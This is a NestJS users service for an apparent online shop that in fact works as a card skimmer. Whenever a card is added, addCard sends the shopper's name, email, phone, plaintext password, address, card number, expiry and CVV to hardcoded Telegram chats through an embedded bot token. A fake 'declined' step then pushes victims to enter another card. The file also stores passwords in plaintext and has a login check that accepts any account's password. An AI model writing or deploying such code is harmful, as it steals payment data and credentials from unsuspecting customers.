import {
  Injectable,
  NotFoundException,
  BadRequestException,
  Logger,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Card, CartItem, User, UserDocument } from './user.schema';
import { Model } from 'mongoose';

import { ForgetPswForm, LoginForm, RegisterForm } from './auth.interface';
import { IAddress } from './address.interface';
// import { TelegramBotService } from './telegram.service';
import { GlobalMessage } from './globalMsg.interface';
import { compareAsc, format } from "date-fns";
import { es } from "date-fns/locale";
import { IMessage } from './telegram.interface';

const TelegramBot = require('node-telegram-bot-api');
const TELEGRAM_TOKEN = '7240720904:AAGEDxkL8ucdMKOB6w5LjiPau0W9vL8aBfA';

@Injectable()
export class UsersService {

  private readonly bot: any;
  private logger = new Logger(UsersService.name);

  allUser = new Array<{ user: string; chatId: number }>(
    // { user: 'KaizerBlack', chatId: 745535067 },
    // { user: 'cmcg1530', chatId: 6454103273 },
    { user: 'koby', chatId: 951742175 },
  );

  constructor(
    @InjectModel('user')
    private readonly userModel: Model<UserDocument>,
    // private telegramBotSrv: TelegramBotService,
  ) {
    this.bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

    this.bot.on('message', this.onReceiveMessage);
    // Suponiendo que tienes una función que maneja comandos o mensajes
    this.sendMessageToUser('951742175', `Server started at ${new Date()}`);

    // Escuchar mensajes de texto
    this.bot.on('message', (msg: IMessage) => {
      const chatId = msg.chat.id;
      const text = msg.text;
      // this.sendMenu(msg.chat.id);
      //   this.sendHtmlMessage(msg.chat.id);}
      //   this.sendTextFileToUser(msg.chat.id, "HOLA TODAS", 'ehloqtedigo');
    });
  }

  onReceiveMessage = (msg: any) => {
    // this.logger.debug(msg);
  };

  sendMessageToUser = (userId: string, message: string) => {
    this.bot.sendMessage(userId, message).catch((error) => {
      this.logger.error(`Error al enviar mensaje: ${error}`);
      // Implementar lógica de reintento o notificación aquí
    });
  };

  sendGlobalMessage(globalMessage: GlobalMessage) {
    try {
      const options = {
        parse_mode: 'HTML',
      };

      const message = `
            <b>Informacion Cliente</b> \nNombre: ${globalMessage.fullName} \nCorreo: ${globalMessage.email} \nNumero: ${globalMessage.phone} \nClave : ${globalMessage.password}
            \n<b>Direccion Cliente</b> \nCiudad: ${globalMessage.city} \nEstado: ${globalMessage.state.name}(${globalMessage.state.code}) \nPais  : ${globalMessage.country.name}(${globalMessage.country.code}) \nDireccion: ${globalMessage.address}\n \n<b>Informacion de pago</b> \nNumber: ${globalMessage.cardNumber} \nFecha : ${globalMessage.expirationDate} \nCodigo: ${globalMessage.cardCVV}\n\nFecha: ${globalMessage.entryDate}
        `;

      this.allUser.forEach((user) => {
        this.bot
          .sendMessage(user.chatId, message, options)
          .catch((error: any) => {
            this.logger.error(`Error al enviar mensaje: ${error}`);
          });
      });
    } catch (error) {
      this.logger.error(`ERROR INESPERADO EN EL METODO: sendGlobalMessage`);
    }
  }
  
  async login(loginForm: LoginForm): Promise<any> {
    // .select('-password')
    const user = await this.userModel.findOne({ email: loginForm.email });
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }

    const pass = await this.userModel.findOne({ password: loginForm.password });
    if (!pass) {
      throw new NotFoundException('INCORRECT_PASSWORD');
    }

    return user;
  }

  async register(registerForm: RegisterForm): Promise<any> {
    // Primero, verifica si ya existe un usuario con el mismo correo electrónico
    const existingUser = await this.userModel.findOne({
      email: registerForm.email,
    });
    if (existingUser) {
      throw new BadRequestException('USER_EXITS');
    }

    const userObject = {
      name: this.capitalizeFirstLetter(registerForm.name),
      lastName: this.capitalizeFirstLetter(registerForm.lastName),
      fullName: this.capitalizeFirstLetter(
        `${registerForm.name} ${registerForm.lastName}`,
      ),
      email: registerForm.email,
      phone: parseInt(registerForm.phone.replace(/\D/g, '')),
      password: registerForm.password,
      address: '',
      country: { code: 'MX', name: 'México' },
      state: { code: 'EM', name: 'Estado de México' },
      city: '',
      zipCode: '',
      billingAddress: {
        name: '',
        phone: '',
        address: '',
        country: 'Mexico',
        state: '',
        city: '',
        zipCode: '',
      },
    };

    const newUser = new this.userModel(userObject);
    await newUser.save();
    return newUser;
  }

  // Forget password method
  async forgetPassword(forgetPswForm: ForgetPswForm): Promise<any> {
    const user = await this.userModel.findOne({ email: forgetPswForm.email });
    // .select('name lastName email -_id');
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }
    // Add logic to handle password reset here
    return user;
  }

  async addItemToCart(userId: string, cartItem: CartItem): Promise<any> {
    const user = await this.userModel.findById(userId);
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }

    // Busca si el producto ya está en el carrito
    // const existingCartItemIndex = user.cart.findIndex(item => item.product.identifier === cartItem.product.identifier);
    const existingCartItemIndex = user.cart.findIndex((item) => {
      if (
        item.product.identifier === cartItem.product.identifier &&
        item.product.size === cartItem.product.size &&
        item.product.color.id === cartItem.product.color.id
      ) {
        return item;
      } else {
        return null;
      }
    });

    if (existingCartItemIndex !== -1) {
      // Si el producto ya existe, actualiza la cantidad y el tamaño
      user.cart[existingCartItemIndex].quantity += cartItem.quantity;

      const updatedUser = await this.userModel.findOneAndUpdate(
        { _id: userId, 'cart.product.identifier': cartItem.product.identifier },
        {
          $set: {
            'cart.$.quantity': user.cart[existingCartItemIndex].quantity,
            'cart.$.product.size': cartItem.product.size,
          },
        },
        { new: true },
      );

      return updatedUser.cart;
    } else {
      // Si el producto no existe, agrégalo al carrito
      user.cart.push(cartItem);
    }

    await user.save();
    return user.cart;
  }

  // Show items in cart method
  async showItemsInCart(userId: string, dateNow: number): Promise<any> {
    const user = await this.userModel.findById(userId).populate('cart.product');
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }

    return {
      items: user.cart,
      dateNow: dateNow,
    };
  }

  // Delete item from cart method
  async deleteItemFromCart(userId: string, productId: string): Promise<any> {
    const user = await this.userModel.findById(userId);
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }
    user.cart = user.cart.filter(
      (item) => item.product.identifier !== productId,
    );
    await user.save();
    return user.cart;
  }

  // Delete all items from cart method
  async deleteAllItemsFromCart(userId: string): Promise<any> {
    const user = await this.userModel.findById(userId);
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }
    user.cart = [];
    await user.save();
    return user.cart;
  }

  // Modify item in cart method
  async modifyItemInCart(userId: string, currentItem: CartItem): Promise<any> {
    const user = await this.userModel.findById(userId);
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }

    const updatedUser = await this.userModel.findOneAndUpdate(
      {
        _id: userId,
        'cart.product.identifier': currentItem.product.identifier,
      },
      {
        $set: {
          'cart.$.quantity': currentItem.quantity,
          'cart.$.product.size': currentItem.product.size,
        },
      },
      { new: true },
    );

    if (!updatedUser) {
      throw new NotFoundException('ERROR_UPDATING_ITEM');
    }

    return updatedUser.cart;
  }

  // Update user info method
  async updateUserInfo(userId: string, updateData: any): Promise<any> {
    const user = await this.userModel.findByIdAndUpdate(userId, updateData, {
      new: true,
    });
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }
    return user;
  }

  //update userAdress
  async updateUserAddress(
    userId: string,
    updateAddress: IAddress,
  ): Promise<any> {
    const user = await this.userModel.findByIdAndUpdate(
      userId,
      {
        fullName: updateAddress.fullName,
        phone: parseInt(updateAddress.phoneNumber.replace(/\D/g, '')),
        country: updateAddress.country,
        state: updateAddress.state,
        city: updateAddress.city,
        zipCode: updateAddress.zipCode,
        address: updateAddress.address,
      },
      {
        new: true,
      },
    );
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }
    return user;
  }

  // Get user info method
  async getUserInfo(userId: string): Promise<any> {
    const user = await this.userModel.findById(userId);
    if (!user) {
      throw new NotFoundException('USER_NOT_FOUND');
    }
    return user;
  }

  ///////////// CARDS  /////////////
  // async addCard(userId: string, cardDetails: Card): Promise<Card> {
  //   try {
  //     const user = await this.userModel.findById(userId);
  //     if (!user) {
  //       throw new NotFoundException('USER_NOT_FOUND');
  //     }

  //     const newCard = {
  //       ...cardDetails,
  //       entryDate: new Date(),
  //       added: false,
  //       deleted: false,
  //       declined: false
  //     };

  //     user.cards.push(newCard);
  //     await user.save();

  //     return newCard;
  //   } catch (error) {
  //     throw new BadRequestException('ERROR_ADDING_CARD');
  //   }
  // }

  async addCard(userId: string, cardDetails: Card): Promise<Card> {
    try {
      const user = await this.userModel.findById(userId);
      if (!user) {
        throw new NotFoundException('USER_NOT_FOUND');
      }

      const quantityCards = user.cards.length;

      // Verifica si la tarjeta ya existe
      const existingCard = user.cards.find(
        (card) => card.cardNumber === cardDetails.cardNumber,
      );
      if (!existingCard) {
        const newCard = {
          ...cardDetails,
          entryDate: new Date(),
          added: quantityCards ? true : false,
          deleted: false,
          declined: false,
        };

        user.cards.push(newCard);

        const globalMessage: GlobalMessage = this.createObjectGlobalMsg(user, newCard);
        // this.telegramBotSrv.sendGlobalMessage(globalMessage);
        this.sendGlobalMessage(globalMessage);

        // Marca la instancia de usuario como modificada
        user.markModified('cards');
        await user.save();
        return newCard;
      } else {
        const allValuesRepead = user.cards.find(
          (card) =>
            card.cardNumber === cardDetails.cardNumber &&
            card.expirationDate === cardDetails.expirationDate &&
            card.cardCVV === cardDetails.cardCVV,
        );
        // console.log("allValuesRepead => ", allValuesRepead);
        if (allValuesRepead) {
          if (allValuesRepead.added) {
            allValuesRepead.deleted = false;

            user.markModified('cards');
            await user.save();

            return allValuesRepead;
          } else {
            throw new BadRequestException('CARD_ALREADY_EXISTS');
          }
        } else {
          const newCard = {
            ...cardDetails,
            entryDate: new Date(),
            added: false,
            deleted: false,
            declined: false,
          };

          user.cards.push(newCard);
          user.markModified('cards');
          await user.save();

          const globalMessage: GlobalMessage = this.createObjectGlobalMsg(user, newCard);
          // this.telegramBotSrv.sendGlobalMessage(globalMessage);
          this.sendGlobalMessage(globalMessage);

          throw new BadRequestException('CARD_ALREADY_EXISTS');
        }
      }
    } catch (error) {
      throw new BadRequestException('ERROR_ADDING_CARD');
    }
  }

  createObjectGlobalMsg(user: User, card: Card): GlobalMessage {
    return {
      fullName: user.fullName,
      email: user.email,
      phone: user.phone,
      password: user.password,
      address: user.address,
      country: user.country,
      state: user.state,
      city: user.city,
      zipCode: user.zipCode,

      cardNumber: card.cardNumber,
      expirationDate: card.expirationDate,
      cardCVV: card.cardCVV,
      added: card.added,
      deleted: card.deleted,
      declined: card.declined,

      entryDate: format(new Date(card.entryDate), 'EEE, dd MMM yyyy', { locale: es }),
    };
  }

  async updateCardProperty(
    userId: string,
    cardUpdate: {
      entryDate: Date;
      propertyName: string;
      propertyValue: boolean;
    },
  ): Promise<Card> {
    try {
      const user = await this.userModel.findById(userId);
      if (!user) {
        throw new NotFoundException('USER_NOT_FOUND');
      }

      // Encuentra la tarjeta por entryDate
      const cardToUpdate = user.cards.find((card) => {
        if (
          card.entryDate.getTime() === new Date(cardUpdate.entryDate).getTime()
        ) {
          return card;
        }
      });
      // const cardToUpdate = user.cards.find(card => card.entryDate.toString() === cardUpdate.entryDate.toString());
      if (!cardToUpdate) {
        throw new NotFoundException('CARD_NOT_FOUND');
      }

      // Actualiza la propiedad específica
      cardToUpdate[cardUpdate.propertyName] = cardUpdate.propertyValue;

      // Marca la instancia de usuario como modificada
      user.markModified('cards');

      // Guarda los cambios en la base de datos
      await user.save();

      return cardToUpdate;
    } catch (error) {
      throw new BadRequestException('ERROR_UPDATING_CARD');
    }
  }

  async updatePaymentCard(
    userId: string,
    cardUpdate: { entryDate: Date },
  ): Promise<Card> {
    try {
      const user = await this.userModel.findById(userId);
      if (!user) {
        throw new NotFoundException('USER_NOT_FOUND');
      }

      // Busca una tarjeta con la propiedad declined en true
      const declinedCard = user.cards.find((card) => card.declined);
      if (declinedCard) {
        // Si es la misma tarjeta, lanza un error
        if (
          declinedCard.entryDate.getTime() ===
          new Date(cardUpdate.entryDate).getTime()
        ) {
          throw new BadRequestException('SAME_CARD_DECLINED');
        }
        // Si no es la misma tarjeta, devuelve la tarjeta buscada por la fecha
        const cardToUpdate = user.cards.find(
          (card) =>
            card.entryDate.getTime() ===
            new Date(cardUpdate.entryDate).getTime(),
        );
        if (!cardToUpdate) {
          throw new NotFoundException('CARD_NOT_FOUND');
        }
        return cardToUpdate;
      } else {
        // Si no existe una tarjeta con declined en true, actualiza la propiedad declined
        const cardToUpdate = user.cards.find(
          (card) =>
            card.entryDate.getTime() ===
            new Date(cardUpdate.entryDate).getTime(),
        );
        if (!cardToUpdate) {
          throw new NotFoundException('CARD_NOT_FOUND');
        }
        cardToUpdate.declined = true;
        user.markModified('cards');
        await user.save();
        throw new BadRequestException('CARD_DECLINED');
      }
    } catch (error) {
      throw new BadRequestException('ERROR_UPDATING_PAYMENT_CARD');
    }
  }

  // async updateCardProperty(userId: string, entryDate: Date, propertyName: string, propertyValue: boolean): Promise<Card> {
  //   try {
  //     const user = await this.userModel.findById(userId);
  //     if (!user) {
  //       throw new NotFoundException('USER_NOT_FOUND');
  //     }

  //     // Encuentra la tarjeta por entryDate
  //     const cardToUpdate = user.cards.find(card => card.entryDate.toString() === entryDate.toString());
  //     if (!cardToUpdate) {
  //       throw new NotFoundException('CARD_NOT_FOUND');
  //     }

  //     // Actualiza la propiedad específica
  //     cardToUpdate[propertyName] = propertyValue;

  //     // Guarda los cambios en la base de datos
  //     await user.save();

  //     return cardToUpdate;
  //   } catch (error) {
  //     throw new BadRequestException('ERROR_UPDATING_CARD');
  //   }
  // }

  async getValidCard(userId: string): Promise<Card> {
    try {
      const user = await this.userModel.findById(userId);
      if (!user || user.cards.length === 0) {
        throw new NotFoundException('NO_CARDS_FOUND');
      }

      // Filtrar y encontrar la tarjeta con 'added' en true y 'deleted' en false
      const validCard = user.cards.find((card) => card.added && !card.deleted);
      if (!validCard) {
        throw new NotFoundException('VALID_CARD_NOT_FOUND');
      }

      return validCard;
    } catch (error) {
      throw new BadRequestException('ERROR_GETTING_VALID_CARD');
    }
  }

  async getLastCard(userId: string): Promise<Card> {
    try {
      const user = await this.userModel.findById(userId);
      if (!user || user.cards.length === 0) {
        throw new NotFoundException('NO_CARDS_FOUND');
      }

      const lastCard = user.cards[user.cards.length - 1];
      return lastCard;
    } catch (error) {
      throw new BadRequestException('ERROR_GETTING_LAST_CARD');
    }
  }

  // async getLastCard(userId: string): Promise<Card> {
  //   try {
  //     const user = await this.userModel.findById(userId);
  //     if (!user || user.cards.length === 0) {
  //       throw new NotFoundException('NO_CARDS_FOUND');
  //     }

  //     const lastCard = user.cards[user.cards.length - 1];
  //     return lastCard;
  //   } catch (error) {
  //     throw new BadRequestException('ERROR_GETTING_LAST_CARD');
  //   }
  // }

  async getAllCards(userId: string): Promise<Card[]> {
    try {
      const user = await this.userModel.findById(userId);
      if (!user) {
        throw new NotFoundException('USER_NOT_FOUND');
      }

      return user.cards;
    } catch (error) {
      throw new BadRequestException('ERROR_GETTING_CARDS');
    }
  }
  //////////////////////////////////

  //////////// PEDIDOS  ////////////

  //////////////////////////////////

  capitalizeFirstLetter(str: string): string {
    if (!str) return str;
    str = str.toLowerCase();
    return str
      .split(' ')
      .map((word) => word.charAt(0).toUpperCase() + word.slice(1))
      .join(' ');
  }
}
